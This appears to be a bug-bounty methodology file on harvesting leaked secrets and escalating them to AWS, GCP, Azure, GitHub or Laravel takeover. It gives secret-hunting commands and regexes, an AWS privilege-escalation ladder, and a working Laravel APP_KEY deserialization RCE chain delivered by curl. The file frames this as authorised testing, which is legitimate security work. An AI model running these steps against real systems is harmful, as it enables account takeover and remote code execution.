# Secrets Recon → Cloud/Org Takeover

> A leaked key is not the bug — **what it unlocks** is. One live AWS key → account takeover. One `.env` → Laravel RCE + cloud creds + DB. This file: where secrets leak, how to verify (identity-only), and how to escalate a verified secret into a P1 cloud/org takeover.

**Iron rule:** verify a secret with a **`whoami`-class identity call only**. Never read customer data, never modify, never create infra beyond a single marker. In the report, prove *validity + scope*, never share the secret itself.

---

## 1. Where secrets leak (harvest order = signal order)

| Source | Command / where |
|---|---|
| **Exposed `.env`** on host | `curl -s https://$H/.env` (also `.env.local/.production/.bak`, `/config/.env`) |
| **Client JS bundles** | `trufflehog filesystem js/ --only-verified` ; `jsluice secrets js/*.js` |
| **Source maps** | pull `.map` → reconstruct source → grep secrets |
| **GitHub org/members** | `trufflehog github --org=$ORG --only-verified` ; `noseyparker scan github --org $ORG` |
| **GitHub commit history / gists** | `gh search code --owner $ORG "AKIA"` ; deleted-but-cached commits |
| **GitHub Actions logs / artifacts** | public repo → Actions tab → logs; artifacts often hold `.env`/tokens |
| **Postman public workspaces** | search `$ORG` (env vars hold live tokens) |
| **Docker images** | `docker pull $ORG/img && trufflehog docker --image $ORG/img` (layers) |
| **npm/PyPI published pkgs** | download tarball → grep (build artifacts leak `.npmrc`, tokens) |
| **S3/Firebase buckets** | dumps often contain `.env`, `config.json`, `.pem` (→ cloud-storage.md) |
| **Wayback** | `gau $T | grep -E '\.(env|json|yml|yaml|pem|key|bak)$'` → fetch archived copy |

```bash
# High-signal grep once you have any file corpus
grep -rEno \
 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|ghp_[0-9A-Za-z]{36}|github_pat_[0-9A-Za-z_]{82}|xox[baprs]-[0-9A-Za-z-]+|sk-[a-zA-Z0-9]{20,}|sk_live_[0-9a-zA-Z]{24,}|SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43}|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|-----BEGIN [A-Z ]*PRIVATE KEY-----' \
 js/ dumped/ . 2>/dev/null
```

---

## 2. Verify (identity-only) then map blast radius

### AWS  `AKIA…` / `ASIA…` (+ secret)
```bash
aws configure set aws_access_key_id AKIA... ; aws configure set aws_secret_access_key ...
aws sts get-caller-identity                 # WHO — that's your proof, stop-ish
enumerate-iam --access-key AKIA... --secret-key ...   # what the key CAN do (read-only)
# ScoutSuite / cloudsplaining for permission map ; Pacu for structured (in scope) enum
```
**Takeover ladder (report the reachable rungs, don't detonate):**
`sts:GetCallerIdentity` → `iam:List*/Get*` → **privesc**: `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, `iam:PassRole`+`lambda:CreateFunction`, `iam:CreateAccessKey` on another user → **admin** → whole account. Real 2024–25 extortion campaigns did exactly this from leaked `.env` keys (create admin role → Lambda → internet-wide scan). Prove the *capability* (e.g., `iam:CreatePolicyVersion` allowed via `enumerate-iam`), don't create the admin.

### GCP  `AIza…` / service-account JSON
```bash
# Service account JSON:
gcloud auth activate-service-account --key-file sa.json
gcloud projects list ; gcloud auth print-access-token   # proof
# AIza (API key): scope-test against enabled APIs — Firebase (accounts:signUp), Maps billing abuse, etc.
```

### Azure  client_id/secret/tenant, SAS, connection string
```bash
az login --service-principal -u <id> -p <secret> --tenant <tid>
az account show ; az role assignment list   # scope
# Storage connection string / SAS → blob access (→ cloud-storage.md §4)
```

### GitHub PAT  `ghp_…` / `github_pat_…`
```bash
curl -s -H "Authorization: token ghp_..." https://api.github.com/user            # identity
curl -s -H "Authorization: token ghp_..." https://api.github.com/user/repos | jq '.[].full_name'
# Scope = repo/org write? → source tamper, CI secret exfil, dependency-confusion push → supply-chain RCE.
```

### Others (verify → note scope, don't abuse)
```
Slack   xoxb-/xoxp-   → https://slack.com/api/auth.test  (team, user) → team.info/users.list scope
Stripe  sk_live_      → GET https://api.stripe.com/v1/account  (LIVE vs test matters for severity)
SendGrid SG.…         → GET https://api.sendgrid.com/v3/scopes → mail-send = phishing-as-them
Twilio  AC…/token     → GET https://api.twilio.com/2010-04-01/Accounts.json
Mailgun/Postmark/SES  → send scope = brand phishing
Firebase AIza         → accounts:signUp → token → auth-gated DB (cloud-storage.md §5e)
JWT signing secret    → forge admin tokens (top10-unauth.md §5)
DB creds (from .env)  → connect ONLY if host reachable + in scope; else report as-is
```

---

## 3. `.env` → Laravel APP_KEY → unauth RCE (2025 mass class)

GitGuardian/Synacktiv extracted 260k+ APP_KEYs from GitHub; 600+ apps confirmed RCE-able. `decrypt()` auto-`unserialize()`s → gadget-chain RCE.

```bash
# 0. Get key: /.env returns 200 with APP_KEY=base64:...  (or from GitHub)
# 1. Confirm the key is LIVE by decrypting an existing session cookie
python3 laravel_crypto_killer.py decrypt -k "$APP_KEY" -v "$laravel_session_cookie"
# 2. Build a gadget chain (RCE9/RCE13/… depending on installed libs)
php phpggc Laravel/RCE9 system 'id' -b            # base64 serialized payload
# 3. Encrypt it under the leaked key → forged cookie
python3 laravel_crypto_killer.py encrypt -k "$APP_KEY" -v "$phpggc_b64"
# 4. Deliver in X-XSRF-TOKEN or laravel_session; server decrypt()→unserialize()→RCE
curl -s https://$H/ -H "X-XSRF-TOKEN: <encrypted>"
```
`APP_DEBUG=true` compounds it (stack traces, env dump on the Ignition error page — historically CVE-2021-3129 RCE too). Prove with `id`; stop.

Other framework parallels: **Rails** `secret_key_base` leak → signed-cookie deserialization RCE; **Django** `SECRET_KEY` → forge sessions/tokens; **Flask** secret → `flask-unsign` cookie forgery; **ASP.NET** machineKey/ViewState → deserialization RCE.

---

## 4. GitHub org deep-dive (source → secret → CI → supply chain)

```bash
gh api "orgs/$ORG/repos?per_page=100" --paginate | jq -r '.[].full_name'
# Secrets across all repos + full history
noseyparker scan github --org $ORG && noseyparker report
trufflehog github --org=$ORG --only-verified --results=verified
gitleaks detect --source <clonedir> --report-format json
# Actions supply-chain: read .github/workflows/*.yml for pwn-request / injection / self-hosted runners
#   → route to cicd-security skill for pull_request_target + secret exfil chains
# Internal package names in lockfiles/bundles → dependency-confusion.md
```

---

## Escalation summary (secret → P1)
- AWS key + `iam:*`/`PassRole`/`CreateAccessKey` reachable → **account takeover** (prove capability).
- `.env` on host → Laravel APP_KEY RCE **and** the cloud/DB creds inside it → double P1.
- GitHub write PAT → CI secret exfil / dependency-confusion push → **supply-chain RCE**.
- Firebase `AIza` → anon token → auth-gated mass PII.
- Signing secret (JWT/Rails/Django/ASP.NET) → forge admin → org-wide ATO.

Lead the report with the *proven capability and blast radius*, e.g. "this key can create IAM users → full AWS account control," backed by an identity call + a permission listing — not raw exfiltrated data.
